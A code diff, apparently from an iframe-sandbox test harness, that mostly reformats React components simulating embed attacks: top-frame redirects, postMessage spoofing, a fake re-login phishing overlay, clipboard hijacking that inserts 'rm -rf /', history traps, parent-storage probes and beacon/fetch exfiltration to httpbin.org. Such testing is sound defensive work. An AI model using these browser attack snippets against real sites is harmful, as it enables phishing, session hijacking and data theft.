@@ -6,8 +6,6 @@ import { buildRedirectTarget } from "@/lib/redirectTarget";
 import { useEmbedContext } from "./EmbedContext";
 import { useState } from "react";
 
-type Push = (s: string) => void;
-
 /* ============================================================
  * 시나리오별 임베드 컴포넌트.
  * 각 컴포넌트는 EmbedShell 을 wrap 해서 title + actions + (optional UI).
@@ -25,7 +23,7 @@ const TopRedirect = () => {
         {
           label: "top.location 변경",
           danger: true,
-          run: (push) => {
+          run: push => {
             try {
               window.top!.location.href = target();
               push("호출 완료");
@@ -64,10 +62,10 @@ const PRESET_MSGS: { label: string; data: unknown }[] = [
 const PostMessage = () => (
   <EmbedShell
     title="postMessage 스푸핑"
-    actions={PRESET_MSGS.map<IEmbedAction>((p) => ({
+    actions={PRESET_MSGS.map<IEmbedAction>(p => ({
       label: p.label,
       danger: true,
-      run: (push) => {
+      run: push => {
         window.parent.postMessage(p.data, "*");
         push(`sent: ${JSON.stringify(p.data)}`);
       },
@@ -85,9 +83,11 @@ const PhishingForm = () => {
         {
           label: "수집 시뮬레이션",
           danger: true,
-          run: (push) =>
+          run: push =>
             push(
-              `email=${email || "(empty)"} pw=${pw ? "*".repeat(pw.length) : "(empty)"}`,
+              `email=${email || "(empty)"} pw=${
+                pw ? "*".repeat(pw.length) : "(empty)"
+              }`
             ),
         },
       ]}
@@ -96,14 +96,14 @@ const PhishingForm = () => {
         <input
           placeholder="email"
           value={email}
-          onChange={(e) => setEmail(e.target.value)}
+          onChange={e => setEmail(e.target.value)}
           style={{ marginBottom: 6 }}
         />
         <input
           placeholder="password"
           type="password"
           value={pw}
-          onChange={(e) => setPw(e.target.value)}
+          onChange={e => setPw(e.target.value)}
         />
       </div>
     </EmbedShell>
@@ -117,7 +117,7 @@ const AutoDownload = () => (
       {
         label: "Blob 다운로드",
         danger: true,
-        run: (push) => {
+        run: push => {
           const b = new Blob(["auto-downloaded payload"], {
             type: "text/plain",
           });
@@ -146,7 +146,7 @@ const PopupSpam = () => {
         {
           label: "window.open(self)",
           danger: true,
-          run: (push) => {
+          run: push => {
             const w = window.open(location.href, "_blank");
             push(w ? "열림" : "차단됨");
           },
@@ -154,7 +154,7 @@ const PopupSpam = () => {
         {
           label: "window.open(target)",
           danger: true,
-          run: (push) => {
+          run: push => {
             const w = window.open(
               buildRedirectTarget(
                 window.location.origin,
@@ -162,9 +162,9 @@ const PopupSpam = () => {
                 "popup-spam",
                 {
                   surface: "popup",
-                },
+                }
               ),
-              "_blank",
+              "_blank"
             );
             push(w ? "열림" : "차단됨");
           },
@@ -180,7 +180,7 @@ const AutoplayMedia = () => (
     actions={[
       {
         label: "video play (muted)",
-        run: async (push) => {
+        run: async push => {
           const v = document.createElement("video");
           v.src = "https://www.w3schools.com/html/mov_bbb.mp4";
           v.muted = true;
@@ -197,7 +197,7 @@ const AutoplayMedia = () => (
       {
         label: "requestFullscreen",
         danger: true,
-        run: async (push) => {
+        run: async push => {
           try {
             await document.documentElement.requestFullscreen();
             push("풀스크린 진입");
@@ -219,7 +219,7 @@ const NotificationPermission = () => (
       {
         label: "requestPermission",
         danger: true,
-        run: async (push) => {
+        run: async push => {
           push(`current=${Notification.permission}`);
           const r = await Notification.requestPermission();
           push(`result=${r}`);
@@ -236,16 +236,16 @@ const ClipboardHijack = () => (
       {
         label: "copy 이벤트 가로채기 활성화",
         danger: true,
-        run: (push) => {
+        run: push => {
           document.addEventListener(
             "copy",
-            (e) => {
+            e => {
               e.preventDefault();
               const evil = "rm -rf / ← clipboard hijacked";
               (e as ClipboardEvent).clipboardData?.setData("text/plain", evil);
               push(`hijack: 덮어쓴 값="${evil}"`);
             },
-            { once: false },
+            { once: false }
           );
           push("후크 설치 완료. 아래 텍스트를 복사해보세요.");
         },
@@ -253,7 +253,7 @@ const ClipboardHijack = () => (
       {
         label: "writeText 시도",
         danger: true,
-        run: async (push) => {
+        run: async push => {
           try {
             await navigator.clipboard.writeText("hijacked by iframe");
             push("writeText 성공");
@@ -338,7 +338,7 @@ const HistoryPollution = () => (
       {
         label: "10번 pushState",
         danger: true,
-        run: (push) => {
+        run: push => {
           for (let i = 0; i < 10; i++)
             history.pushState({}, "", `?pol=${Date.now()}-${i}`);
           push("history 10개 오염됨");
@@ -347,7 +347,7 @@ const HistoryPollution = () => (
       {
         label: "뒤로가기 트랩",
         danger: true,
-        run: (push) => {
+        run: push => {
           window.addEventListener("popstate", () => {
             history.pushState({}, "", "?trap=" + Date.now());
           });
@@ -364,7 +364,7 @@ const SopProbe = () => (
     actions={[
       {
         label: "parent.document",
-        run: (push) => {
+        run: push => {
           try {
             const h = window.parent.document.documentElement.outerHTML;
             push(`성공: ${h.slice(0, 60)}...`);
@@ -375,7 +375,7 @@ const SopProbe = () => (
       },
       {
         label: "parent.location.href",
-        run: (push) => {
+        run: push => {
           try {
             push(`성공: ${window.parent.location.href}`);
           } catch (e) {
@@ -385,7 +385,7 @@ const SopProbe = () => (
       },
       {
         label: "parent.localStorage",
-        run: (push) => {
+        run: push => {
           try {
             const k = Object.keys(window.parent.localStorage);
             push(`성공: ${JSON.stringify(k)}`);
@@ -405,7 +405,7 @@ const FormAutoSubmit = () => (
       {
         label: "POST 외부",
         danger: true,
-        run: (push) => {
+        run: push => {
           const f = document.createElement("form");
           f.method = "POST";
           f.action = "https://httpbin.org/post";
@@ -431,7 +431,7 @@ const BeaconExfil = () => (
       {
         label: "sendBeacon",
         danger: true,
-        run: (push) => {
+        run: push => {
           const ok = navigator.sendBeacon(
             "https://httpbin.org/post",
             new Blob(
@@ -441,8 +441,8 @@ const BeaconExfil = () => (
                   ua: navigator.userAgent,
                 }),
               ],
-              { type: "application/json" },
-            ),
+              { type: "application/json" }
+            )
           );
           push(`sendBeacon=${ok}`);
         },
@@ -450,7 +450,7 @@ const BeaconExfil = () => (
       {
         label: "fetch POST",
         danger: true,
-        run: async (push) => {
+        run: async push => {
           try {
             const r = await fetch("https://httpbin.org/post", {
               method: "POST",
@@ -474,7 +474,7 @@ const CsrfImage = () => (
       {
         label: "img.src 발사",
         danger: true,
-        run: (push) => {
+        run: push => {
           const img = document.createElement("img");
           img.src = `https://httpbin.org/image/png?fired=${Date.now()}`;
           img.alt = "";
@@ -499,7 +499,7 @@ const TokenExfil = () => (
       {
         label: "전체 자동",
         danger: true,
-        run: (push) => {
+        run: push => {
           push(`referrer=${document.referrer || "(empty)"}`);
           const ao = (
             location as Location & { ancestorOrigins?: DOMStringList }
@@ -514,7 +514,7 @@ const TokenExfil = () => (
             setTimeout(() => {
               window.parent.postMessage(p, "*");
               push(`sent: ${JSON.stringify(p)}`);
-            }, i * 250),
+            }, i * 250)
           );
           setTimeout(() => {
             try {
@@ -528,8 +528,7 @@ const TokenExfil = () => (
       },
       {
         label: "내 storage 키",
-        run: (push) =>
-          push(`local=${JSON.stringify(Object.keys(localStorage))}`),
+        run: push => push(`local=${JSON.stringify(Object.keys(localStorage))}`),
       },
     ]}
   />
@@ -550,12 +549,12 @@ const ParentListenerProbe = () => {
         {
           label: "전체 순차 발사",
           danger: true,
-          run: (push) => {
+          run: push => {
             PAYLOADS.forEach((p, i) =>
               setTimeout(() => {
                 window.parent.postMessage(p, "*");
                 push(`sent: ${JSON.stringify(p).slice(0, 80)}`);
-              }, i * 250),
+              }, i * 250)
             );
           },
         },
@@ -574,12 +573,12 @@ const DelayedAttack = () => {
         {
           label: "top.location (즉시)",
           danger: true,
-          run: (push) => {
+          run: push => {
             try {
               window.top!.location.href = buildRedirectTarget(
                 window.location.origin,
                 locale,
-                "delayed-attack",
+                "delayed-attack"
               );
             } catch (e) {
               push(`차단: ${(e as Error).message}`);
@@ -589,7 +588,7 @@ const DelayedAttack = () => {
         {
           label: "postMessage AUTH",
           danger: true,
-          run: (push) => {
+          run: push => {
             window.parent.postMessage({ type: "AUTH", token: "FAKE" }, "*");
             push("sent");
           },
@@ -609,7 +608,7 @@ const ChainedAttack = () => {
         {
           label: "체인 시작",
           danger: true,
-          run: (push) => {
+          run: push => {
             push("[1/3] 오버레이");
             setStep("overlay");
           },
@@ -635,16 +634,18 @@ const ChainedAttack = () => {
             Example Workspace — 재로그인 필요
           </h2>
           <form
-            onSubmit={(e) => {
+            onSubmit={e => {
               e.preventDefault();
               setStep("done");
               try {
                 window.top!.location.href = buildRedirectTarget(
                   window.location.origin,
                   locale,
-                  "chained-attack",
+                  "chained-attack"
                 );
-              } catch {}
+              } catch {
+                // sandbox policies can intentionally block top navigation here.
+              }
             }}
           >
             <input
